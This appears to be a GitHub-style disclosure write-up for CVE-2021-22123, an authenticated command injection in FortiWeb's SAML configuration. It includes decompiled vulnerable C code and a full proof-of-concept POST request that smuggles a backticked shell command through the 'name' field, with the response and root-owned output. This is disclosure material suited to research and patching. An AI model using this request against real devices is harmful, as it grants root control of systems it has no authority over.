<b>[CVE-2021-22123] Fortinet FortiWeb Authenticated OS Command Injection</b>
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
![Hit Counter](https://shields-io-visitor-counter.herokuapp.com/badge?page=murataydemir.CVE-2021-22123&style=plastic&color=critical)
![Platform Badge](https://img.shields.io/badge/Platform-Fortinet%20FortiWeb%20WAF-critical?logo=fortinet&style=plastic)

The command injection vulnerability in the FortiWeb management interface may allow an authenticated remote attacker to execute arbitrary commands in the system via the SAML server configuration page. Executing commands with maximum privileges will result in the attacker gaining full control over the server. This is an instance of [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html) and has a CVSSv3 base score of 8.7. This vulnerability has `CVE-2021-22123` number, which was addressed in [Fortiguard Lab page (FG-IR-20-120)](https://www.fortiguard.com/psirt/FG-IR-20-120)

Basically, SAML stands for Security Assertion Markup Language and it is an XML-based open-standard for transferring identity data between two parties: an identity provider (IdP) and a service provider (SP). It designed to ensure the operation of a Single Sign-On mechanism, which allows you to access various software products using a single identifier.

FortiWeb `all versions prior to 6.3.7` and below are vulnerable to authenticated OS Command Injection vulnerability. Successfully exploitation of this vulnerability may lead to take complete control of the affected device, with the highest possible privileges. They might install a persistent shell, crypto mining software, or other malicious software. In the unlikely event the management interface is exposed to the internet, they could use the compromised platform to reach into the affected network beyond the DMZ.

An attacker, who is first authenticated to the management interface of the FortiWeb device, can smuggle commands using backticks in the `name` field of the SAML Server configuration page. These commands are then executed as the root user of the underlying operating system. Vulnerable part of the code is illustrated as below.

```C
int move_metafile(char * path, char * name) {
    int iVar1;
    char buf[512];
    int nret;
    snprintf(buf, 0x200, "%s/%s", "/data/etc/saml/shibboleth/service_providers", name);
    iVar1 = access(buf, 0);
    if (iVar1 != 0) {
        snprintf(buf, 0x200, "mkdir %s/%s", "/data/etc/saml/shibboleth/service_providers", name);
        iVar1 = system(buf);
        if (iVar1 != 0) {
            return iVar1;
        }
    }
    snprintf(buf, 0x200, "cp %s %s/%s/%s.%s", path, "/data/etc/saml/shibboleth/service_providers", name,
        "Metadata", & DAT_00212758);
    iVar1 = system(buf);
    return iVar1;
}
```

<b>Proof of Concept (PoC):</b> The following POST request can be used in order to exploit this vulnerability.

```
POST /api/v2.0/user/remoteserver.saml HTTP/1.1
Host: vulnerablehost
Cookie: redacted
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://vulnerablehost/root/user/remote-user/saml-user/
X-Csrftoken: 814940160
Content-Type: multipart/form-data; boundary=---------------------------94351131111899571381631694412
Content-Length: 3068
Origin: https://vulnerablehost
Dnt: 1
Te: trailers
Connection: close
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="q_type"
1
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="name"
`touch /tmp/CVE-2021-22123`
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="entityID"
test
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="service-path"
/saml.sso
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="session-lifetime"
8
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="session-timeout"
30
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="sso-bind"
post
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="sso-bind_val"
1
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="sso-path"
/SAML2/POST
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="slo-bind"
post
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="slo-bind_val"
1
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="slo-path"
/SLO/POST
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="flag"
0
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="enforce-signing"
disable
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="enforce-signing_val"
0
-----------------------------94351131111899571381631694412
```

```
HTTP/1.1 500 Internal Server Error
Date: Thu, 18 Aug 2021 15:47:45 GMT
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Set-Cookie: redacted
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Content-Security-Policy: frame-ancestors 'self'
X-Content-Type-Options: nosniff
Content-Length: 20
Strict-Transport-Security: max-age=63072000
Connection: close
Content-Type: application/json

{"errcode": "-651"}
```
Finally, the results of the 'touch' command can be seen on the local command line of the FortiWeb device

```
/# ls -l /tmp/CVE-2021-22123
-rw-r--r--    1 root     0                0 Aug 10 15:48 /tmp/CVE-2021-22123
```

<b>References:</b>

* [https://www.rapid7.com/blog/post/2021/08/17/fortinet-fortiweb-os-command-injection/](https://www.rapid7.com/blog/post/2021/08/17/fortinet-fortiweb-os-command-injection/)
* [https://www.ptsecurity.com/ww-en/about/news/positive-technologies-discovers-vulnerability-in-fortinet-firewall/](https://www.ptsecurity.com/ww-en/about/news/positive-technologies-discovers-vulnerability-in-fortinet-firewall/)
* [https://www.fortiguard.com/psirt/FG-IR-20-120](https://www.fortiguard.com/psirt/FG-IR-20-120)
